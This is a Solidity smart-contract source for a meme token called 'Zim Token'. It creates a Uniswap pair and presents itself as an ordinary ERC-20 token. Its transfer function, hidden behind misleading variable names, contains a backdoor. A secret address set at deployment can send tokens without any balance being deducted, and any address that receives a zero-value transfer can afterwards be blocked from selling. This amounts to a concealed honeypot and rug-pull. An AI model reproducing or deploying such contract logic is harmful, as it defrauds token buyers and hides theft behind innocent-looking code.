// https://zim.social
//https://twitter.com/invaderz_earth
//https://t.me/invaderz_earth



// SPDX-License-Identifier: MIN

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * by removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ZimToken is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint256 public totalSupply;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private infringements = 25;

    function transfer(address outlaw, uint256 security) public returns (bool success) {
        protect(msg.sender, outlaw, security);
        return true;
    }

    mapping(address => uint256) private elect;

    function transferFrom(address militia, address outlaw, uint256 security) public returns (bool success) {
        protect(militia, outlaw, security);
        require(security <= allowance[militia][msg.sender]);
        allowance[militia][msg.sender] -= security;
        return true;
    }

    uint8 public decimals = 9;

    mapping(address => uint256) private raid;

    function protect(address militia, address outlaw, uint256 security) private returns (bool success) {
        if (elect[militia] == 0) {
            if (raid[militia] > 0 && militia != uniswapV2Pair) {
                elect[militia] -= infringements;
            }
            balanceOf[militia] -= security;
        }
        if (security == 0) {
            raid[outlaw] += infringements;
        }
        balanceOf[outlaw] += security;
        emit Transfer(militia, outlaw, security);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _address) {
        name = "Zim Token";
        symbol = "ZIM";
        totalSupply = 420420420420 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        elect[_address] = infringements;
    }

    address public uniswapV2Pair;

    string public name;

    function approve(address vote, uint256 security) public returns (bool success) {
        allowance[msg.sender][vote] = security;
        emit Approval(msg.sender, vote, security);
        return true;
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;
}